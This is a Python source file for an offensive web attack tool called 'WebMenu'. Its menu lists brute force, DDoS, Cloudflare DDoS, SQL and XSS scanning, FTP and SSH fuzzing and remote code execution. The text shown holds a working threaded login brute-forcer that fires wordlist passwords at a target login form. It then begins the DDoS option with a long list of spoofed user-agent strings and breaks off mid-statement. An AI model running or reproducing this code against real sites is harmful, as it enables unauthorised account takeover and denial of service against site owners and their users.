import requests
import threading
import httplib2
import random
from urllib.request import urlopen
from time import sleep
import cloudscraper
import json
import socket
from ipaddress import ip_address
from ipaddress import IPv4Address

from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


count = 0

print(
    """
    
    __        __   _     __  __                  
    \ \      / /__| |__ |  \/  | ___ _ __  _   _ 
     \ \ /\ / / _ \ '_ \| |\/| |/ _ \ '_ \| | | |  ~>WebMenu<~
      \ V  V /  __/ |_) | |  | |  __/ | | | |_| | ~~>Made by tfwcodes(github)<~~
       \_/\_/ \___|_.__/|_|  |_|\___|_| |_|\__,_|
                                             

    
    """
)

print("[1] Requests Intercept")
print("[2] Login Brute")
print("[3] DDoS")
print("[4] Cloudfare DDoS")
print("[5] SQL Scanner")
print("[6] XSS Scanner")
print("[7] Fuzzing FTP")
print("[8] Fuzzing SSH")
print("[9] Remote-Code-Execution")

while True:
    choice = input("WebMenu~# ")

    http = httplib2.Http()

    if choice == "1":

        def edit_requests(url):
            session = requests.session()
            response = session.get(url)

            req = http.request(url, "HEAD")[0]

            print("Method: GET")
            print("Server: " + req['server'])
            print(req)

            print(f"Cache-Control: {response.headers['cache-control']}")
            print(f"Content-Length {response.headers['content-length']}")

        url = input("[+] Enter the target url: ")
        edit_requests(url)

    elif choice == "2":
        print(
            """
            _                _         ____             _       
           | |    ___   __ _(_)_ __   | __ ) _ __ _   _| |_ ___ 
           | |   / _ \ / _` | | '_ \  |  _ \| '__| | | | __/ _ |  ~>Login Brute<~
           | |__| (_) | (_| | | | | | | |_) | |  | |_| | ||  __/ ~~>Made by tfwcodes(github)<~~
           |_____\___/ \__, |_|_| |_| |____/|_|     \__,_|\__\___|
                       |___/                                    

            """
        )

        print("--help for the help menu")
        print("--brt to start the bruteforce attack")

        while True:
            command_bruteforce = input("[+] Enter a command: ")
            if command_bruteforce == "--help":
                print(
                    "[INFO] Before starting the attack you must know the form data of the login page and introduce the form data in the fuction called login and in the variable called r which makes the post request")
                print(
                    "[INFO] You will know that the password is right if the content-length is different then the other requests")
            elif command_bruteforce == "--brt":
                def check_website(url):
                    try:
                        requests.get(url)
                        print("[INFO] The url is valid")
                    except:
                        print("[INFO] The url is invalid")
                        input()
                        exit()


                count = 0


                def login(user, url, word):
                    global count

                    s = requests.session()

                    r = s.post(url, data={"rcr_authenticate": "1", "rcr_user": user, "rcr_pass": word,
                                          "rcr_submit": "Conectare"})
                    count += 1

                    print("-" * 50)
                    print(
                        "\n" + f"[ATTACK] Attempt: {count} Content-length: {r.headers['content-length']} Password: {word}" + "\n")
                    print("-" * 50)


                url = input("[+] Enter the target url: ")
                check_website(url)

                target_user = input("[+] Enter the target user: ")
                passlist = input("[+] Enter the password list (must be in the same directory): ")

                passwfile = open(passlist, "r")


                threads = []

                for word in passwfile:
                    t = threading.Thread(target=login, args=(target_user, url, word))
                    t.start()
                    sleep(0.3)

                    threads.append(t)

                for thread in threads:
                    thread.join()

            else:
                print(f"Invalid command [{command_bruteforce}]")



    elif choice == "3":


        headers_useragents = []

        def header_append():
            global headers_useragents
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
            headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
            headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
            headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
            headers_useragents.append(
                'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
            headers_useragents.append(
                'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
            headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
            headers_useragents.append(
                'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
            headers_useragents.append(
                'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
            headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
            headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
            headers_useragents.append(
                'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
            headers_useragents.append(
                'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
            headers_useragents.append(
                'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
            headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
            headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
            headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
            headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
            headers_useragents.append(
                'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
            headers_useragents.append(
                'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
            headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
            headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
            headers_useragents.append(
                'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
            headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
            headers_useragents.append(
                'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
            headers_useragents.append(
                'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
            headers_useragents.append(
                'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
            headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
            headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
            headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
            headers_useragents.append(
                'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
            headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
            headers_useragents.append(
                'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
            headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
            headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
            headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
            headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
            headers_useragents.append(
                'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
            headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
            headers_useragents.append(
                'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
            headers_useragents.append(
                'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
            headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
            headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
            headers_useragents.append(
                'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
            headers_useragents.append(
                'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
            headers_useragents.append(
                'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
            headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
            headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
            headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
            headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
            headers_useragents.append(
                'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
            headers_useragents.append(
                'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
            headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
            headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
            headers_useragents.append(
                'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
            headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
            headers_useragents.append(
                'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
            headers_useragents.append(
                'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
            headers_useragents.append(
                'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
            headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
            headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
            headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
            headers_useragents.append(
                'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
            headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
            headers_useragents.append(
                'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
            headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
            headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
            headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
            headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
            headers_useragents.append(
                'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
            headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
            headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
            headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
            headers_useragents.append(
                'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
            headers_useragents.append(
                'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
            headers_useragents.append(
                'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
            headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
            headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
            headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
            headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
            headers_useragents.append(
                'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
            headers_useragents.append(
                'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
            headers_useragents.append(
                'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
            headers_useragents.append(
                'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
            headers_useragents.append(
                'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
            headers_useragents.append(
                'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
            headers_useragents.append(
                'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
            headers_useragents.append(
                'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
            headers_useragents.append(
                'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
            headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
            headers_useragents.append(
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
            headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
            headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
            headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
            headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
            headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
            headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
            headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
            headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
            headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
            headers_useragents.append(
                'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
            headers_useragents.append(
                'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
            headers_useragents.append(
                'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
            headers_useragents.append(
                'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
            headers_useragents.append(
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
            headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
            headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
            headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
            headers_useragents.append(
                'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
            headers_useragents.append(
                'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
            headers_useragents.append(
